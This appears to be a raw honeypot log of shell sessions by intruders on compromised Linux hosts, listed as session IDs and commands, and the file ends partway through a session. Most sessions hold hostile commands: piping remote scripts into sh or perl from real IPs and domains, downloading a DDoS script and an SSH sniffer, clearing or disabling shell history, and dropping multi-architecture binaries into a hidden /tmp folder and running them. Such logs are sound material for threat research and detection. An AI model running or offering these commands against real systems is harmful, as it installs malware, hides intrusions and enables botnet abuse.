4421bd44936c40ca882cbeff00ef7415	chmod 777 /tmp/.xs/test.mod
4421bd44936c40ca882cbeff00ef7415	/tmp/.xs/test.mod
2c1c01a9369a46848209a6f78a779742	cd /tmp
2c1c01a9369a46848209a6f78a779742	wget http://185.61.138.34/gb.sh
178a0c8e80d844069dfc3ec5d51f4819	cd /tmp
178a0c8e80d844069dfc3ec5d51f4819	wget http://185.61.138.34/gb.sh
8c679fc98e3e44468a8ae2a4cc772c63	curl -o /tmp/25002 http://222.186.21.201:2014/25002
8c679fc98e3e44468a8ae2a4cc772c63	/tmp/25002
f40706a5a0304b039e2116bc5f709907	set +o history
f40706a5a0304b039e2116bc5f709907	wget -qO - http://musti.be/lul  |  perl
aad5d27c91a44f3a91c727b4a747fe37	set +o history
aad5d27c91a44f3a91c727b4a747fe37	wget -qO - http://musti.be/lul  |  perl
aad5d27c91a44f3a91c727b4a747fe37	exit
f40706a5a0304b039e2116bc5f709907	exit
dfa629ce6d444b7e941b617b5564e25a	set +o history
dfa629ce6d444b7e941b617b5564e25a	wget -qO - http://musti.be/lul  |  perl
f8baabe2ff384ff9a6d5f2c1fa1f2b1d	set +o history
f8baabe2ff384ff9a6d5f2c1fa1f2b1d	wget -qO - http://musti.be/lul  |  perl
dfa629ce6d444b7e941b617b5564e25a	exit
f8baabe2ff384ff9a6d5f2c1fa1f2b1d	exit
11e31c02e8b44ac0a31394507f201eb7	curl -o /tmp/u251 http://222.186.21.201:2014/u251
11e31c02e8b44ac0a31394507f201eb7	chmod 777 /tmp/u251
11e31c02e8b44ac0a31394507f201eb7	/tmp/u251
d58be0abefd1442ca7d9ea19f14a012a	echo -n test
d58be0abefd1442ca7d9ea19f14a012a	cat /proc/version
2f9442704e8e4384b7ed41167e30a448	mkdir /tmp/.xs/
2f9442704e8e4384b7ed41167e30a448	cat  > /tmp/.xs/daemon.armv4l.mod
2f9442704e8e4384b7ed41167e30a448	chmod 777 /tmp/.xs/daemon.armv4l.mod
2f9442704e8e4384b7ed41167e30a448	/tmp/.xs/daemon.armv4l.mod
7c4c43d7b6ed45c8869eab472efbc416	mkdir /tmp/.xs/
7c4c43d7b6ed45c8869eab472efbc416	cat  > /tmp/.xs/daemon.i686.mod
7c4c43d7b6ed45c8869eab472efbc416	chmod 777 /tmp/.xs/daemon.i686.mod
7c4c43d7b6ed45c8869eab472efbc416	/tmp/.xs/daemon.i686.mod
7ac9b066f9a44cdeb1402a7c142b0b9e	mkdir /tmp/.xs/
7ac9b066f9a44cdeb1402a7c142b0b9e	cat  > /tmp/.xs/daemon.mips.mod
7ac9b066f9a44cdeb1402a7c142b0b9e	chmod 777 /tmp/.xs/daemon.mips.mod
7ac9b066f9a44cdeb1402a7c142b0b9e	/tmp/.xs/daemon.mips.mod
83e32c6201254997be6b059d9fab3736	mkdir /tmp/.xs/
83e32c6201254997be6b059d9fab3736	cat  > /tmp/.xs/daemon.mipsel.mod
83e32c6201254997be6b059d9fab3736	chmod 777 /tmp/.xs/daemon.mipsel.mod
83e32c6201254997be6b059d9fab3736	/tmp/.xs/daemon.mipsel.mod
df87532df377452cb9b02eef8919dcac	mkdir /tmp/.xs/
df87532df377452cb9b02eef8919dcac	cat  > /tmp/.xs/test.mod
df87532df377452cb9b02eef8919dcac	chmod 777 /tmp/.xs/test.mod
df87532df377452cb9b02eef8919dcac	/tmp/.xs/test.mod
eb1dc5afebf245dc8cf6d9631c968a0f	wget -qO - http://104.199.163.91/x/1sh  |  sh  >  /dev/null 2 > &1 &
eb1dc5afebf245dc8cf6d9631c968a0f	rm -rf /var/run/1sh
eb1dc5afebf245dc8cf6d9631c968a0f	wget -c http://104.199.163.91/x/1sh -P /var/run
eb1dc5afebf245dc8cf6d9631c968a0f	wget -qO - http://104.199.163.91/x/2sh  |  sh  >  /dev/null 2 > &1 &
eb1dc5afebf245dc8cf6d9631c968a0f	rm -rf /tmp/2sh
eb1dc5afebf245dc8cf6d9631c968a0f	wget -c http://104.199.163.91/x/2sh -P /tmp
eb1dc5afebf245dc8cf6d9631c968a0f	curl http://104.199.163.91/x/3sh  |  sh
9ee625f34ad2427e9f54f51a4892d44b	uname -r
5c8dc46aa69141aaa778d70cd823e7fb	cd /etc
5c8dc46aa69141aaa778d70cd823e7fb	wget -c http://61.147.107.109:7531/ycier
2ffa415771284e60beaf065fe97050b1	mkdir /tmp/.xs/
2ffa415771284e60beaf065fe97050b1	cat  > /tmp/.xs/daemon.armv4l.mod
2ffa415771284e60beaf065fe97050b1	chmod 777 /tmp/.xs/daemon.armv4l.mod
2ffa415771284e60beaf065fe97050b1	/tmp/.xs/daemon.armv4l.mod
004a5b79074846eabdb71a45c659a2c6	mkdir /tmp/.xs/
004a5b79074846eabdb71a45c659a2c6	cat  > /tmp/.xs/daemon.i686.mod
004a5b79074846eabdb71a45c659a2c6	chmod 777 /tmp/.xs/daemon.i686.mod
004a5b79074846eabdb71a45c659a2c6	/tmp/.xs/daemon.i686.mod
138794f7292842f2bb68418493446c49	mkdir /tmp/.xs/
138794f7292842f2bb68418493446c49	cat  > /tmp/.xs/daemon.mips.mod
138794f7292842f2bb68418493446c49	chmod 777 /tmp/.xs/daemon.mips.mod
138794f7292842f2bb68418493446c49	/tmp/.xs/daemon.mips.mod
afa11d745eec4aceb9df2f1ef317062c	mkdir /tmp/.xs/
afa11d745eec4aceb9df2f1ef317062c	cat  > /tmp/.xs/daemon.mipsel.mod
afa11d745eec4aceb9df2f1ef317062c	chmod 777 /tmp/.xs/daemon.mipsel.mod
afa11d745eec4aceb9df2f1ef317062c	/tmp/.xs/daemon.mipsel.mod
feb33dbc7bce46059ebc2630b2338d65	mkdir /tmp/.xs/
feb33dbc7bce46059ebc2630b2338d65	cat  > /tmp/.xs/test.mod
feb33dbc7bce46059ebc2630b2338d65	chmod 777 /tmp/.xs/test.mod
feb33dbc7bce46059ebc2630b2338d65	/tmp/.xs/test.mod
8fc3bf62020f4c3e9e823235030e51b8	mkdir /tmp/.xs/
8fc3bf62020f4c3e9e823235030e51b8	cat  > /tmp/.xs/daemon.armv4l.mod
8fc3bf62020f4c3e9e823235030e51b8	chmod 777 /tmp/.xs/daemon.armv4l.mod
8fc3bf62020f4c3e9e823235030e51b8	/tmp/.xs/daemon.armv4l.mod
c01efd3780bc4d6c8555650033442fe0	mkdir /tmp/.xs/
c01efd3780bc4d6c8555650033442fe0	cat  > /tmp/.xs/daemon.i686.mod
c01efd3780bc4d6c8555650033442fe0	chmod 777 /tmp/.xs/daemon.i686.mod
c01efd3780bc4d6c8555650033442fe0	/tmp/.xs/daemon.i686.mod
50eeb90f6b914543aa7e382eaa2bbba5	mkdir /tmp/.xs/
50eeb90f6b914543aa7e382eaa2bbba5	cat  > /tmp/.xs/daemon.mips.mod
50eeb90f6b914543aa7e382eaa2bbba5	chmod 777 /tmp/.xs/daemon.mips.mod
50eeb90f6b914543aa7e382eaa2bbba5	/tmp/.xs/daemon.mips.mod
283e9e945b9e4c91ad135f67ec92c456	mkdir /tmp/.xs/
283e9e945b9e4c91ad135f67ec92c456	cat  > /tmp/.xs/daemon.mipsel.mod
283e9e945b9e4c91ad135f67ec92c456	chmod 777 /tmp/.xs/daemon.mipsel.mod
283e9e945b9e4c91ad135f67ec92c456	/tmp/.xs/daemon.mipsel.mod
877ff592b7bb4401ac6ceb2702e162c6	cd /tmp
877ff592b7bb4401ac6ceb2702e162c6	wget http://208.67.1.46/ddos.pl
b828eb46309a4b15a8667d15d72f1509	set +o history
b828eb46309a4b15a8667d15d72f1509	wget -qO - http://musti.be/lul  |  perl
3edad51fb26948f081030a623972cf53	set +o history
3edad51fb26948f081030a623972cf53	wget -qO - http://musti.be/lul  |  perl
3edad51fb26948f081030a623972cf53	exit
b828eb46309a4b15a8667d15d72f1509	exit
06d9a9027705499c9b6b7e1eee4e4c4b	set +o history
06d9a9027705499c9b6b7e1eee4e4c4b	wget -qO - http://musti.be/lul  |  perl
d3fea13bab1445ea97b084c374b794a1	set +o history
d3fea13bab1445ea97b084c374b794a1	wget -qO - http://musti.be/lul  |  perl
06d9a9027705499c9b6b7e1eee4e4c4b	exit
d3fea13bab1445ea97b084c374b794a1	exit
ccc4b27182f141cda970a82bcb574f23	set +o history
ccc4b27182f141cda970a82bcb574f23	wget -qO - http://musti.be/lul  |  perl
0ab958077b094f378bb50afe737a4568	set +o history
0ab958077b094f378bb50afe737a4568	wget -qO - http://musti.be/lul  |  perl
0ab958077b094f378bb50afe737a4568	exit
ccc4b27182f141cda970a82bcb574f23	exit
fe7f6618d37d47d1978f542685128e7c	ls
fe7f6618d37d47d1978f542685128e7c	uname -a
fe7f6618d37d47d1978f542685128e7c	wget
fe7f6618d37d47d1978f542685128e7c	wget 103.41.177.234/sshsniff.tgz
61bfab92876b4fc184a6fd4dc91f124c	set +o history
61bfab92876b4fc184a6fd4dc91f124c	wget -qO - http://musti.be/lul  |  perl
e9021fc124a84efd966c279145b744ae	set +o history
e9021fc124a84efd966c279145b744ae	wget -qO - http://musti.be/lul  |  perl
61bfab92876b4fc184a6fd4dc91f124c	exit
e9021fc124a84efd966c279145b744ae	exit
e5415963a91742d5ae47332d869ce316	set +o history
e5415963a91742d5ae47332d869ce316	wget -qO - http://musti.be/lul  |  perl
92f9d0cd3dbb437aa33555df5d2527f5	set +o history
92f9d0cd3dbb437aa33555df5d2527f5	wget -qO - http://musti.be/lul  |  perl
e5415963a91742d5ae47332d869ce316	exit
92f9d0cd3dbb437aa33555df5d2527f5	exit
ced8e18aaa224440b1e1149c6d6c18fa	curl -o /tmp/u251 http://222.186.21.201:2014/u251
ced8e18aaa224440b1e1149c6d6c18fa	/tmp/u251
13dfa335b0074ddeae0ce6ab766d07a9	echo -n test
13dfa335b0074ddeae0ce6ab766d07a9	cat /proc/version
b737d37929024013b7988816b7d820e7	mkdir /tmp/.xs/
b737d37929024013b7988816b7d820e7	cat  > /tmp/.xs/daemon.armv4l.mod
b737d37929024013b7988816b7d820e7	chmod 777 /tmp/.xs/daemon.armv4l.mod
b737d37929024013b7988816b7d820e7	/tmp/.xs/daemon.armv4l.mod
3f166e8c9793439a8f20113c0c3b3b08	mkdir /tmp/.xs/
3f166e8c9793439a8f20113c0c3b3b08	cat  > /tmp/.xs/daemon.i686.mod
3f166e8c9793439a8f20113c0c3b3b08	chmod 777 /tmp/.xs/daemon.i686.mod
3f166e8c9793439a8f20113c0c3b3b08	/tmp/.xs/daemon.i686.mod
a4dfdb2bb57848aea078ed170002c3ae	mkdir /tmp/.xs/
a4dfdb2bb57848aea078ed170002c3ae	cat  > /tmp/.xs/daemon.mips.mod
a4dfdb2bb57848aea078ed170002c3ae	chmod 777 /tmp/.xs/daemon.mips.mod
a4dfdb2bb57848aea078ed170002c3ae	/tmp/.xs/daemon.mips.mod
a9a0c8ec30834416b9397ea5195475ed	mkdir /tmp/.xs/
a9a0c8ec30834416b9397ea5195475ed	cat  > /tmp/.xs/daemon.mipsel.mod
a9a0c8ec30834416b9397ea5195475ed	chmod 777 /tmp/.xs/daemon.mipsel.mod
a9a0c8ec30834416b9397ea5195475ed	/tmp/.xs/daemon.mipsel.mod
e2629499854b4e41b7922fef9f9a7aac	mkdir /tmp/.xs/
e2629499854b4e41b7922fef9f9a7aac	cat  > /tmp/.xs/test.mod
e2629499854b4e41b7922fef9f9a7aac	chmod 777 /tmp/.xs/test.mod
e2629499854b4e41b7922fef9f9a7aac	/tmp/.xs/test.mod
db26b902b5c941429b9ec1c10f781fc8	set +o history
db26b902b5c941429b9ec1c10f781fc8	wget -qO - http://musti.be/lul  |  perl
c767b3fb3fe94e76a0e56521c623057f	set +o history
c767b3fb3fe94e76a0e56521c623057f	wget -qO - http://musti.be/lul  |  perl
db26b902b5c941429b9ec1c10f781fc8	exit
c767b3fb3fe94e76a0e56521c623057f	exit
bf8eb165b93c4cffa6f3c33fb98112cd	mkdir /tmp/.xs/
bf8eb165b93c4cffa6f3c33fb98112cd	cat  > /tmp/.xs/daemon.armv4l.mod
bf8eb165b93c4cffa6f3c33fb98112cd	chmod 777 /tmp/.xs/daemon.armv4l.mod
bf8eb165b93c4cffa6f3c33fb98112cd	/tmp/.xs/daemon.armv4l.mod
813dee2b774e4848b2f1f771ca73e5cb	mkdir /tmp/.xs/
813dee2b774e4848b2f1f771ca73e5cb	cat  > /tmp/.xs/daemon.i686.mod
813dee2b774e4848b2f1f771ca73e5cb	chmod 777 /tmp/.xs/daemon.i686.mod
813dee2b774e4848b2f1f771ca73e5cb	/tmp/.xs/daemon.i686.mod
c96d3ac2716d4e95803ed809ab33a1ba	mkdir /tmp/.xs/
c96d3ac2716d4e95803ed809ab33a1ba	cat  > /tmp/.xs/daemon.mips.mod
c96d3ac2716d4e95803ed809ab33a1ba	chmod 777 /tmp/.xs/daemon.mips.mod
c96d3ac2716d4e95803ed809ab33a1ba	/tmp/.xs/daemon.mips.mod
616832c72995475d8e51d9cca80001fd	mkdir /tmp/.xs/
616832c72995475d8e51d9cca80001fd	cat  > /tmp/.xs/daemon.mipsel.mod
616832c72995475d8e51d9cca80001fd	chmod 777 /tmp/.xs/daemon.mipsel.mod
616832c72995475d8e51d9cca80001fd	/tmp/.xs/daemon.mipsel.mod
a0d44493a98b48ea81cdbe6aa99fba1e	mkdir /tmp/.xs/
a0d44493a98b48ea81cdbe6aa99fba1e	cat  > /tmp/.xs/test.mod
a0d44493a98b48ea81cdbe6aa99fba1e	chmod 777 /tmp/.xs/test.mod
a0d44493a98b48ea81cdbe6aa99fba1e	/tmp/.xs/test.mod
8267c1d322094b8c8b4a94dcf770a952	mkdir /tmp/.xs/
8267c1d322094b8c8b4a94dcf770a952	cat  > /tmp/.xs/daemon.armv4l.mod
8267c1d322094b8c8b4a94dcf770a952	chmod 777 /tmp/.xs/daemon.armv4l.mod
8267c1d322094b8c8b4a94dcf770a952	/tmp/.xs/daemon.armv4l.mod
36bfbeaf94354d57acf9f2798b10c2d7	mkdir /tmp/.xs/
36bfbeaf94354d57acf9f2798b10c2d7	cat  > /tmp/.xs/daemon.i686.mod
1441c965686e48f58668e698728d9121	w
28f3795b216c40a4ada31cf1f321c64c	uname -a
28f3795b216c40a4ada31cf1f321c64c	cat /etc/issue
28f3795b216c40a4ada31cf1f321c64c	pwd
28f3795b216c40a4ada31cf1f321c64c	cd ..
28f3795b216c40a4ada31cf1f321c64c	ls
28f3795b216c40a4ada31cf1f321c64c	cd /tmp
28f3795b216c40a4ada31cf1f321c64c	ls
28f3795b216c40a4ada31cf1f321c64c	cd /var/tmp/
28f3795b216c40a4ada31cf1f321c64c	ls -la
28f3795b216c40a4ada31cf1f321c64c	wget
28f3795b216c40a4ada31cf1f321c64c	wget donjoan.go.ro/s.jpg
28f3795b216c40a4ada31cf1f321c64c	tar xvf s.jpg
28f3795b216c40a4ada31cf1f321c64c	rm -rf s.jpg
28f3795b216c40a4ada31cf1f321c64c	ls
28f3795b216c40a4ada31cf1f321c64c	rm -rf vand
28f3795b216c40a4ada31cf1f321c64c	rm -rf van
28f3795b216c40a4ada31cf1f321c64c	history -c
28f3795b216c40a4ada31cf1f321c64c	last -30
32c13d1f74304b4fa7fb7ab466cb8cfd	echo -n test
32c13d1f74304b4fa7fb7ab466cb8cfd	cat /proc/version
e0cfabb26c904c19bcfef15db18e0572	mkdir /tmp/.xs/
e0cfabb26c904c19bcfef15db18e0572	cat  > /tmp/.xs/daemon.armv4l.mod
e0cfabb26c904c19bcfef15db18e0572	chmod 777 /tmp/.xs/daemon.armv4l.mod
e0cfabb26c904c19bcfef15db18e0572	/tmp/.xs/daemon.armv4l.mod
df1b4a831b49488bbd0df74d59ccf7ed	mkdir /tmp/.xs/
df1b4a831b49488bbd0df74d59ccf7ed	cat  > /tmp/.xs/daemon.i686.mod
df1b4a831b49488bbd0df74d59ccf7ed	chmod 777 /tmp/.xs/daemon.i686.mod
df1b4a831b49488bbd0df74d59ccf7ed	/tmp/.xs/daemon.i686.mod
0add7236eef0425b93fc04bc71cdb683	mkdir /tmp/.xs/
0add7236eef0425b93fc04bc71cdb683	cat  > /tmp/.xs/daemon.mips.mod
0add7236eef0425b93fc04bc71cdb683	chmod 777 /tmp/.xs/daemon.mips.mod
0add7236eef0425b93fc04bc71cdb683	/tmp/.xs/daemon.mips.mod
a02aee74685d4c7aa8ce783698178cfa	mkdir /tmp/.xs/
a02aee74685d4c7aa8ce783698178cfa	cat  > /tmp/.xs/daemon.mipsel.mod
a02aee74685d4c7aa8ce783698178cfa	chmod 777 /tmp/.xs/daemon.mipsel.mod
a02aee74685d4c7aa8ce783698178cfa	/tmp/.xs/daemon.mipsel.mod
3dacfd0d369c4bdd8018e33087f5055f	mkdir /tmp/.xs/
3dacfd0d369c4bdd8018e33087f5055f	cat  > /tmp/.xs/test.mod
3dacfd0d369c4bdd8018e33087f5055f	chmod 777 /tmp/.xs/test.mod
3dacfd0d369c4bdd8018e33087f5055f	/tmp/.xs/test.mod
bae69cd248f24a5ca6ac7db19097eb9b	set +o history
bae69cd248f24a5ca6ac7db19097eb9b	wget -qO - http://musti.be/lul  |  perl
a06ab5e8b8a941aa89d1d6bef5a43dab	set +o history
a06ab5e8b8a941aa89d1d6bef5a43dab	wget -qO - http://musti.be/lul  |  perl
bae69cd248f24a5ca6ac7db19097eb9b	exit
a06ab5e8b8a941aa89d1d6bef5a43dab	exit
75ee47abbd234529b4276131e9a5dd76	uname
75ee47abbd234529b4276131e9a5dd76	free -m
75ee47abbd234529b4276131e9a5dd76	ps x
b092bd2fba7f4ecfaa0c40ab9838b459	mkdir /tmp/.xs/
b092bd2fba7f4ecfaa0c40ab9838b459	cat  > /tmp/.xs/daemon.armv4l.mod
b092bd2fba7f4ecfaa0c40ab9838b459	chmod 777 /tmp/.xs/daemon.armv4l.mod
b092bd2fba7f4ecfaa0c40ab9838b459	/tmp/.xs/daemon.armv4l.mod
3b8e9fe341c9434e994985d351136998	mkdir /tmp/.xs/
3b8e9fe341c9434e994985d351136998	cat  > /tmp/.xs/daemon.i686.mod
3b8e9fe341c9434e994985d351136998	chmod 777 /tmp/.xs/daemon.i686.mod
3b8e9fe341c9434e994985d351136998	/tmp/.xs/daemon.i686.mod
12db19a16a2e4c93817c4b3e186b02b5	mkdir /tmp/.xs/
12db19a16a2e4c93817c4b3e186b02b5	cat  > /tmp/.xs/daemon.mips.mod
12db19a16a2e4c93817c4b3e186b02b5	chmod 777 /tmp/.xs/daemon.mips.mod
12db19a16a2e4c93817c4b3e186b02b5	/tmp/.xs/daemon.mips.mod
87ca3cefc0e945439b09c2738ed4f749	mkdir /tmp/.xs/
87ca3cefc0e945439b09c2738ed4f749	cat  > /tmp/.xs/daemon.mipsel.mod
87ca3cefc0e945439b09c2738ed4f749	chmod 777 /tmp/.xs/daemon.mipsel.mod
87ca3cefc0e945439b09c2738ed4f749	/tmp/.xs/daemon.mipsel.mod
4e452fed5ee8434bb7de1a3a68b22898	mkdir /tmp/.xs/
4e452fed5ee8434bb7de1a3a68b22898	cat  > /tmp/.xs/test.mod
4e452fed5ee8434bb7de1a3a68b22898	chmod 777 /tmp/.xs/test.mod
4e452fed5ee8434bb7de1a3a68b22898	/tmp/.xs/test.mod
42973e347f3941b59a21a50faac2ae1b	mkdir /tmp/.xs/
42973e347f3941b59a21a50faac2ae1b	cat  > /tmp/.xs/daemon.armv4l.mod
42973e347f3941b59a21a50faac2ae1b	chmod 777 /tmp/.xs/daemon.armv4l.mod
42973e347f3941b59a21a50faac2ae1b	/tmp/.xs/daemon.armv4l.mod
9749b826d74b4cb1a3317961f96a9ff2	mkdir /tmp/.xs/
9749b826d74b4cb1a3317961f96a9ff2	cat  > /tmp/.xs/daemon.i686.mod
9749b826d74b4cb1a3317961f96a9ff2	chmod 777 /tmp/.xs/daemon.i686.mod
9749b826d74b4cb1a3317961f96a9ff2	/tmp/.xs/daemon.i686.mod
cb57ca422bd94917ba0d16317182e670	mkdir /tmp/.xs/
cb57ca422bd94917ba0d16317182e670	cat  > /tmp/.xs/daemon.mips.mod
cb57ca422bd94917ba0d16317182e670	chmod 777 /tmp/.xs/daemon.mips.mod
cb57ca422bd94917ba0d16317182e670	/tmp/.xs/daemon.mips.mod
c29d5e612bd743f2b948bc222cb51ff4	mkdir /tmp/.xs/
c29d5e612bd743f2b948bc222cb51ff4	cat  > /tmp/.xs/daemon.mipsel.mod
c29d5e612bd743f2b948bc222cb51ff4	chmod 777 /tmp/.xs/daemon.mipsel.mod
c29d5e612bd743f2b948bc222cb51ff4	/tmp/.xs/daemon.mipsel.mod
52ebfa9e58494de7b9d9714441c56414	mkdir /tmp/.xs/
52ebfa9e58494de7b9d9714441c56414	cat  > /tmp/.xs/test.mod
52ebfa9e58494de7b9d9714441c56414	chmod 777 /tmp/.xs/test.mod
52ebfa9e58494de7b9d9714441c56414	/tmp/.xs/test.mod
12ae8fe71c9c4079b64d50fc534645f1	mkdir /tmp/.xs/
12ae8fe71c9c4079b64d50fc534645f1	cat  > /tmp/.xs/daemon.armv4l.mod
12ae8fe71c9c4079b64d50fc534645f1	chmod 777 /tmp/.xs/daemon.armv4l.mod
12ae8fe71c9c4079b64d50fc534645f1	/tmp/.xs/daemon.armv4l.mod
462e4a235d3748a2a025c8b114571955	mkdir /tmp/.xs/
462e4a235d3748a2a025c8b114571955	cat  > /tmp/.xs/daemon.i686.mod
462e4a235d3748a2a025c8b114571955	chmod 777 /tmp/.xs/daemon.i686.mod
462e4a235d3748a2a025c8b114571955	/tmp/.xs/daemon.i686.mod
fad96b78254b448c8da67e0d88e71f2c	mkdir /tmp/.xs/
fad96b78254b448c8da67e0d88e71f2c	cat  > /tmp/.xs/daemon.mips.mod
fad96b78254b448c8da67e0d88e71f2c	chmod 777 /tmp/.xs/daemon.mips.mod
fad96b78254b448c8da67e0d88e71f2c	/tmp/.xs/daemon.mips.mod
836d8434a96e4cf9ac4fb315aecef068	mkdir /tmp/.xs/
836d8434a96e4cf9ac4fb315aecef068	cat  > /tmp/.xs/daemon.mipsel.mod
836d8434a96e4cf9ac4fb315aecef068	chmod 777 /tmp/.xs/daemon.mipsel.mod
836d8434a96e4cf9ac4fb315aecef068	/tmp/.xs/daemon.mipsel.mod
314ec345ec13483293bd375ded7d2577	mkdir /tmp/.xs/
314ec345ec13483293bd375ded7d2577	cat  > /tmp/.xs/test.mod
314ec345ec13483293bd375ded7d2577	chmod 777 /tmp/.xs/test.mod
314ec345ec13483293bd375ded7d2577	/tmp/.xs/test.mod
0cab70a3f08747cc8920596905beae27	mkdir /tmp/.xs/
0cab70a3f08747cc8920596905beae27	cat  > /tmp/.xs/daemon.armv4l.mod
0cab70a3f08747cc8920596905beae27	chmod 777 /tmp/.xs/daemon.armv4l.mod
0cab70a3f08747cc8920596905beae27	/tmp/.xs/daemon.armv4l.mod
8d5dfd87d9d24ee59c5d046bfdd0d037	mkdir /tmp/.xs/
8d5dfd87d9d24ee59c5d046bfdd0d037	cat  > /tmp/.xs/daemon.i686.mod
8d5dfd87d9d24ee59c5d046bfdd0d037	chmod 777 /tmp/.xs/daemon.i686.mod
8d5dfd87d9d24ee59c5d046bfdd0d037	/tmp/.xs/daemon.i686.mod
e0e6b404f41246e4828c3f725869b9e6	mkdir /tmp/.xs/
e0e6b404f41246e4828c3f725869b9e6	cat  > /tmp/.xs/daemon.mips.mod
e0e6b404f41246e4828c3f725869b9e6	chmod 777 /tmp/.xs/daemon.mips.mod
e0e6b404f41246e4828c3f725869b9e6	/tmp/.xs/daemon.mips.mod
b6814284f585471d93ab1da724e7f5e7	mkdir /tmp/.xs/
b6814284f585471d93ab1da724e7f5e7	cat  > /tmp/.xs/daemon.mipsel.mod
b6814284f585471d93ab1da724e7f5e7	chmod 777 /tmp/.xs/daemon.mipsel.mod
b6814284f585471d93ab1da724e7f5e7	/tmp/.xs/daemon.mipsel.mod
c2317522ca7f4694ba8514a48b41e6ed	mkdir /tmp/.xs/
c2317522ca7f4694ba8514a48b41e6ed	cat  > /tmp/.xs/test.mod
c2317522ca7f4694ba8514a48b41e6ed	chmod 777 /tmp/.xs/test.mod
c2317522ca7f4694ba8514a48b41e6ed	/tmp/.xs/test.mod
a9519ec4a59f4f3b80c2929252b5fb67	mkdir /tmp/.xs/
a9519ec4a59f4f3b80c2929252b5fb67	cat  > /tmp/.xs/daemon.armv4l.mod
a9519ec4a59f4f3b80c2929252b5fb67	chmod 777 /tmp/.xs/daemon.armv4l.mod
a9519ec4a59f4f3b80c2929252b5fb67	/tmp/.xs/daemon.armv4l.mod
8c979375e7a94579a66b81186afbf8e5	mkdir /tmp/.xs/
8c979375e7a94579a66b81186afbf8e5	cat  > /tmp/.xs/daemon.i686.mod
8c979375e7a94579a66b81186afbf8e5	chmod 777 /tmp/.xs/daemon.i686.mod
8c979375e7a94579a66b81186afbf8e5	/tmp/.xs/daemon.i686.mod
df0fdf8218ef461780cedbacf6a81b9c	mkdir /tmp/.xs/
df0fdf8218ef461780cedbacf6a81b9c	cat  > /tmp/.xs/daemon.mips.mod
df0fdf8218ef461780cedbacf6a81b9c	chmod 777 /tmp/.xs/daemon.mips.mod
df0fdf8218ef461780cedbacf6a81b9c	/tmp/.xs/daemon.mips.mod
91ef6d5ee3c24888805df50f0a3e994c	mkdir /tmp/.xs/
91ef6d5ee3c24888805df50f0a3e994c	cat  > /tmp/.xs/daemon.mipsel.mod
91ef6d5ee3c24888805df50f0a3e994c	chmod 777 /tmp/.xs/daemon.mipsel.mod
91ef6d5ee3c24888805df50f0a3e994c	/tmp/.xs/daemon.mipsel.mod
8798203161d0487b99e9b2bf7a03d4a7	mkdir /tmp/.xs/
8798203161d0487b99e9b2bf7a03d4a7	cat  > /tmp/.xs/test.mod
8798203161d0487b99e9b2bf7a03d4a7	chmod 777 /tmp/.xs/test.mod
8798203161d0487b99e9b2bf7a03d4a7	/tmp/.xs/test.mod
a2f641a7acdb40ef824d05299a4360b4	echo -n test
a2f641a7acdb40ef824d05299a4360b4	cat /proc/version
365424d052a643068a125694ff02dcb9	mkdir /tmp/.xs/
365424d052a643068a125694ff02dcb9	cat  > /tmp/.xs/daemon.armv4l.mod
365424d052a643068a125694ff02dcb9	chmod 777 /tmp/.xs/daemon.armv4l.mod
365424d052a643068a125694ff02dcb9	/tmp/.xs/daemon.armv4l.mod
ad904a32debf452eaf1a067293610a78	mkdir /tmp/.xs/
ad904a32debf452eaf1a067293610a78	cat  > /tmp/.xs/daemon.i686.mod
ad904a32debf452eaf1a067293610a78	chmod 777 /tmp/.xs/daemon.i686.mod
ad904a32debf452eaf1a067293610a78	/tmp/.xs/daemon.i686.mod
58ed8d8846344aab8d3b8430bead286e	mkdir /tmp/.xs/
58ed8d8846344aab8d3b8430bead286e	cat  > /tmp/.xs/daemon.mips.mod
58ed8d8846344aab8d3b8430bead286e	chmod 777 /tmp/.xs/daemon.mips.mod
58ed8d8846344aab8d3b8430bead286e	/tmp/.xs/daemon.mips.mod
9b6dd4cb1d8b4d209b8ffc9b1895b1a6	mkdir /tmp/.xs/
9b6dd4cb1d8b4d209b8ffc9b1895b1a6	cat  > /tmp/.xs/daemon.mipsel.mod
9b6dd4cb1d8b4d209b8ffc9b1895b1a6	chmod 777 /tmp/.xs/daemon.mipsel.mod
9b6dd4cb1d8b4d209b8ffc9b1895b1a6	/tmp/.xs/daemon.mipsel.mod
43d8f111887046858c772dd8141c3cfc	mkdir /tmp/.xs/
43d8f111887046858c772dd8141c3cfc	cat  > /tmp/.xs/test.mod
43d8f111887046858c772dd8141c3cfc	chmod 777 /tmp/.xs/test.mod
43d8f111887046858c772dd8141c3cfc	/tmp/.xs/test.mod
9108d7fa7fb74638b70093725dd85b40	mkdir /tmp/.xs/
9108d7fa7fb74638b70093725dd85b40	cat  > /tmp/.xs/daemon.armv4l.mod
